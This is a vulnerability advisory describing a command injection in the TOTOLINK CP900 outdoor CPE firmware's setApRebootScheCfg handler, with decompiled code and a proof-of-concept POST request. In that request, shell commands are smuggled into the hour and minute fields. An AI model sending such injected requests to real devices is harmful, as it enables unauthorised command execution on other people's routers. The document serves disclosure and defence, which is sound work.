## CP900 command injection

### Overview

* Vendor: TOTOLINK

* Product: CP900
* Version: TOTOLink outdoor CPE CP900_V6.3c.1144_B20190715

* Manufacturer's address：https://www.totolink.net/
* Firmware download address ：https://www.totolink.net/data/upload/20190823/72f2e599854470f5752826473d74b7e0.zip

### Vulnerability details

Totolink outdoor CPE CP900_V6.3c.1144_B20190715 were discovered to contain a command injection vulnerability in the `setApRebootScheCfg` function via the `hour ` or `minute` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

```
int __fastcall setApRebootScheCfg(int a1, int a2, int a3)
 2 {
 3
 4 memset(v20, 0, sizeof(v20));
 5 memset(v21, 0, sizeof(v21));
 6 memset(v19, 0, sizeof(v19));
 7 Var = websGetVar(a2, "mode", "0");
 8 v5 = websGetVar(a2, "week", "");
 9 v6 = (const char *)websGetVar(a2, "hour", "");
10 v7 = (const char *)websGetVar(a2, "minute", "");
 11 v8 = websGetVar(a2, "recHour", "0");
 12 cs_uci_set("system.reboot.mode", Var);
 13 cs_uci_set("system.reboot.week", v5);
 14 cs_uci_set("system.reboot.hour", v6);
 15 cs_uci_set("system.reboot.minute", v7);
 16 cs_uci_set("system.reboot.recHour", v8);
 17 cs_uci_commit("system");
 18 ……
 19 sprintf(v19, "echo '%s %s * * %s reboot ‐f'>> /etc/crontabs/root", v7,
 v6, v21);
 20 v14 = v19;
 21 LABEL_13:
 22 CsteSystem(v14, 0);    //command execution
 23 goto LABEL_3;
 24 ……
 25 }
```

#### PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 127
Origin: http://192.168.0.254
Connection: close
Referer: http://192.168.0.254
Cookie: SESSION_ID=2:1801026000:2

{
    "topicurl": "setting/setApRebootScheCfg",
    "hour": "'1;pwd'",
    "minute": "'2;pwd'"
}
```

